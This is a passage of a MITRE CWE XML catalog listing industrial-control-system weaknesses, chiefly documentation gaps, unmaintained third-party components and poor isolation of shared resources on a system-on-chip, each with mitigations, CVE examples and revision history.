<?xml version="1.0" encoding="UTF-8"?>
<Weakness_Catalog xmlns="http://cwe.mitre.org/cwe-7" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Name="VIEW LIST: CWE-1358: Weaknesses in SEI ETF Categories of Security Vulnerabilities in ICS" Version="4.15" Date="2024-07-16" xsi:schemaLocation="http://cwe.mitre.org/cwe-7 http://cwe.mitre.org/data/xsd/cwe_schema_v7.2.xsd">
   <Weaknesses>
      <Weakness ID="1053" Name="Missing Documentation for Design" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product does not have documentation that represents how it is designed.</Description>
         <Extended_Description><xhtml:p>This issue can make it more difficult to understand and maintain the product. It can make it more difficult and time-consuming to detect and/or fix vulnerabilities.</xhtml:p></Extended_Description>
         <Related_Weaknesses>
           <Related_Weakness Nature="ChildOf" CWE_ID="1059" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <References>
            <Reference External_Reference_ID="REF-963"/>
         </References>
         <Mapping_Notes>
           <Usage>Prohibited</Usage>
           <Rationale>This entry is primarily a quality issue with no direct security implications.</Rationale>
           <Comments>Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.</Comments>
           <Reasons>
             <Reason Type="Other"/>
           </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-07-02</Submission_Date>
               <Submission_Version>3.2</Submission_Version>
               <Submission_ReleaseDate>2019-01-03</Submission_ReleaseDate>
               <Submission_Comment>Entry derived from Common Quality Enumeration (CQE) Draft 0.9.</Submission_Comment>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1059" Name="Insufficient Technical Documentation" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product does not contain sufficient
         technical or engineering documentation (whether on paper or
         in electronic form) that contains descriptions of all the
         relevant software/hardware elements of the product, such as
         its usage, structure, architectural components, interfaces, design, implementation,
         configuration, operation, etc.</Description>
         <Extended_Description>
	   <xhtml:p>When technical documentation is limited or lacking, products are more difficult to maintain.  This indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.</xhtml:p>
	 <xhtml:p>When using time-limited or labor-limited third-party/in-house security consulting services (such as threat modeling, vulnerability discovery, or pentesting), insufficient documentation can force those consultants to invest unnecessary time in learning how the product is organized, instead of focusing their expertise on finding the flaws or suggesting effective mitigations.</xhtml:p>
	 <xhtml:p>With respect to hardware design, the lack of a formal, final manufacturer reference can make it difficult or impossible to evaluate the final product, including post-manufacture verification. One cannot ensure that design functionality or operation is within acceptable tolerances, conforms to specifications, and is free from unexpected behavior. Hardware-related documentation may include engineering artifacts such as hardware description language (HDLs), netlists, Gerber files, Bills of Materials, EDA (Electronic Design Automation) tool files, etc.</xhtml:p>
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="710" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
	 <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
            <Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
			<Technology Class="ICS/OT" Prevalence="Undetermined"/>
	 </Applicable_Platforms>
	 <Modes_Of_Introduction>
	   <Introduction>
	     <Phase>Architecture and Design</Phase>
	   </Introduction>
	   <Introduction>
	     <Phase>Documentation</Phase>
	   </Introduction>
	 </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
               <Impact>Hide Activities</Impact>
               <Impact>Reduce Reliability</Impact>
               <Impact>Quality Degradation</Impact>
               <Impact>Reduce Maintainability</Impact>
	       <Note>Without a method of verification, one cannot be sure that everything only functions as expected.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Documentation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that design documentation is detailed enough to allow for post-manufacturing verification.</Description>
            </Mitigation>
	 </Potential_Mitigations>
	 <Observed_Examples>
	 	<Observed_Example>
			<Reference>CVE-2022-3203</Reference>
            <Description>A wireless access point manual specifies that the only method of configuration is via web interface (CWE-1059), but there is an undisclosed telnet server that was activated by default (CWE-912).</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2022-3203</Link>
		</Observed_Example>
	 </Observed_Examples>
	 <Taxonomy_Mappings>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 2-4</Entry_ID>
	     <Entry_Name>Req SP.02.03 BR</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 2-4</Entry_ID>
	     <Entry_Name>Req SP.02.03 RE(1)</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 2-4</Entry_ID>
	     <Entry_Name>Req SP.03.03 RE(1)</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SG-1</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SG-2</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SG-3</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SG-4</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SG-5</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SG-6</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SG-7</Entry_Name>
	   </Taxonomy_Mapping>
	 </Taxonomy_Mappings>
	 <References>
	   <Reference External_Reference_ID="REF-1248" Section="Poorly Documented or Undocumented Features"/>
           <Reference External_Reference_ID="REF-1254"/>
	 </References>
         <Mapping_Notes>
           <Usage>Prohibited</Usage>
           <Rationale>This entry is primarily a quality issue with no direct security implications.</Rationale>
           <Comments>Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.</Comments>
           <Reasons>
             <Reason Type="Other"/>
           </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-07-02</Submission_Date>
               <Submission_Version>3.2</Submission_Version>
               <Submission_ReleaseDate>2019-01-03</Submission_ReleaseDate>
               <Submission_Comment>Entry derived from Common Quality Enumeration (CQE) Draft 0.9.</Submission_Comment>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Name, Potential_Mitigations, References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>Paul A. Wortman</Contribution_Name>
               <Contribution_Organization>Wells Fargo</Contribution_Organization>
               <Contribution_Date>2021-06-11</Contribution_Date>
               <Contribution_Comment>Submitted hardware-specific information about a "golden standard" that was integrated into this entry</Contribution_Comment>
            </Contribution>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
	    <Previous_Entry_Name Date="2022-04-28">Incomplete Documentation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="1068" Name="Inconsistency Between Implementation and Documented Design" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The implementation of the product is not consistent with the
					design as described within the relevant documentation.</Description>
         <Extended_Description><xhtml:p>This issue makes it more difficult to maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.</xhtml:p></Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="710" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
		 <Applicable_Platforms>
		   <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
		 </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <References>
            <Reference External_Reference_ID="REF-963"/>
         </References>
         <Mapping_Notes>
           <Usage>Prohibited</Usage>
           <Rationale>This entry is primarily a quality issue with no direct security implications.</Rationale>
           <Comments>Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.</Comments>
           <Reasons>
             <Reason Type="Other"/>
           </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-07-02</Submission_Date>
               <Submission_Version>3.2</Submission_Version>
               <Submission_ReleaseDate>2019-01-03</Submission_ReleaseDate>
               <Submission_Comment>Entry derived from Common Quality Enumeration (CQE) Draft 0.9.</Submission_Comment>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1104" Name="Use of Unmaintained Third Party Components" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product relies on third-party components that are not
					actively supported or maintained by the original developer or a trusted proxy
					for the original developer.</Description>
         <Extended_Description><xhtml:p>Reliance on components that are no longer maintained can make it difficult or impossible to fix significant bugs, vulnerabilities, or quality issues. In effect, unmaintained code can become obsolete.</xhtml:p>
<xhtml:p>This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.</xhtml:p></Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1357" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
		 <Applicable_Platforms>
		   <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
		 </Applicable_Platforms>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Reduce Maintainability</Impact>
            </Consequence>
         </Common_Consequences>
         <References>
            <Reference External_Reference_ID="REF-1212"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-07-02</Submission_Date>
               <Submission_Version>3.2</Submission_Version>
               <Submission_ReleaseDate>2019-01-03</Submission_ReleaseDate>
               <Submission_Comment>Entry derived from Common Quality Enumeration (CQE) Draft 0.9.</Submission_Comment>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1110" Name="Incomplete Design Documentation" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product's design documentation does not adequately describe
					control flow, data flow, system initialization, relationships between tasks,
					components, rationales, or other important aspects of the
					design.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1059" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
		 <Applicable_Platforms>
		   <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
		 </Applicable_Platforms>
         <References>
            <Reference External_Reference_ID="REF-963"/>
         </References>
         <Mapping_Notes>
           <Usage>Prohibited</Usage>
           <Rationale>This entry is primarily a quality issue with no direct security implications.</Rationale>
           <Comments>Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.</Comments>
           <Reasons>
             <Reason Type="Other"/>
           </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-07-02</Submission_Date>
               <Submission_Version>3.2</Submission_Version>
               <Submission_ReleaseDate>2019-01-03</Submission_ReleaseDate>
               <Submission_Comment>Entry derived from Common Quality Enumeration (CQE) Draft 0.9.</Submission_Comment>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1111" Name="Incomplete I/O Documentation" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product's documentation does not adequately define inputs,
					outputs, or system/software interfaces.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1059" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <References>
            <Reference External_Reference_ID="REF-963"/>
         </References>
         <Mapping_Notes>
           <Usage>Prohibited</Usage>
           <Rationale>This entry is primarily a quality issue with no direct security implications.</Rationale>
           <Comments>Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.</Comments>
           <Reasons>
             <Reason Type="Other"/>
           </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-07-02</Submission_Date>
               <Submission_Version>3.2</Submission_Version>
               <Submission_ReleaseDate>2019-01-03</Submission_ReleaseDate>
               <Submission_Comment>Entry derived from Common Quality Enumeration (CQE) Draft 0.9.</Submission_Comment>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1189" Name="Improper Isolation of Shared Resources on System-on-a-Chip (SoC)" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The System-On-a-Chip (SoC) does not properly isolate shared resources between trusted and untrusted agents.</Description>
         <Extended_Description>
            <xhtml:p>A System-On-a-Chip (SoC) has a lot of functionality, but it may have a limited number of pins or pads. A pin can only perform one function at a time. However, it can be configured to perform multiple different functions. This technique is called pin multiplexing. Similarly, several resources on the chip may be shared to multiplex and support different features or functions. When such resources are shared between trusted and untrusted agents, untrusted agents may be able to access the assets intended to be accessed only by the trusted agents.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
	   <Related_Weakness Nature="ChildOf" CWE_ID="653" View_ID="1000" Ordinal="Primary"/>
           <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
	   <Related_Weakness Nature="PeerOf" CWE_ID="1331" View_ID="1000"/>
         </Related_Weaknesses>
	 <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
		 </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="System on Chip" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If resources being used by a trusted user are shared with an untrusted user, the untrusted user may be able to modify the functionality of the shared resource of the trusted user.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Quality Degradation</Impact>
               <Note>The functionality of the shared resource may be intentionally degraded.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>Pre-silicon / post-silicon: Test access to shared systems resources (memory ranges, control registers, etc.) from untrusted software to verify that the assets are not incorrectly exposed to untrusted agents. Note that access to shared resources can be dynamically allowed or revoked based on system flows. Security testing should cover such dynamic shared resource allocation and access control modification flows.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                 <xhtml:p>When sharing resources, avoid mixing agents of varying trust levels.</xhtml:p>
                 <xhtml:p>Untrusted agents should not share resources with trusted agents.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
	      <Intro_Text>Consider the following SoC
	      design. The Hardware Root of Trust (HRoT) local SRAM is memory mapped in the core{0-N}
	      address space. The HRoT allows or disallows access to private memory ranges, thus
	      allowing the sram to function as a mailbox for communication between untrusted and
	      trusted HRoT partitions.</Intro_Text>
	    <Body_Text>
	    <xhtml:img src="https://cwe.mitre.org/data/images/HRoT-CWE.png" alt="Hardware Root of Trust"/>
	    <xhtml:p>
	      We assume that the threat is from malicious software in
	      the untrusted domain. We assume this software has access
	      to the core{0-N} memory map and can be running at any
	      privilege level on the untrusted cores. The capability
	      of this threat in this example is communication to and
	      from the mailbox region of SRAM modulated by the
	      hrot_iface. To address this threat, information must not
	      enter or exit the shared region of SRAM through
	      hrot_iface when in secure or privileged mode.
	      </xhtml:p>
	    </Body_Text>
            </Demonstrative_Example>
          </Demonstrative_Examples>
	  <Observed_Examples>
	    <Observed_Example>
	      <Reference>CVE-2020-8698</Reference>
	      <Description>Processor has improper isolation of shared resources allowing for information disclosure.</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2020-8698</Link>
	    </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2019-6260</Reference>
	      <Description>Baseboard Management Controller (BMC) device implements Advanced High-performance Bus (AHB) bridges that do not require authentication for arbitrary read and write access to the BMC's physical address space from the host, and possibly the network [REF-1138].</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2019-6260</Link>
	    </Observed_Example>
	  </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="124"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-1036"/>
	    <Reference External_Reference_ID="REF-1138"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
			   <Submission_Name>Arun Kanuparthi, Hareesh Khattri, Parbati Kumar Manna, Narasimha Kumar V Mangipudi</Submission_Name>
               <Submission_Organization>Intel Corporation</Submission_Organization>
               <Submission_Date>2019-10-15</Submission_Date>
               <Submission_Version>4.0</Submission_Version>
               <Submission_ReleaseDate>2020-02-24</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description, Name, Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Description, Observed_Examples, References, Relationships, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
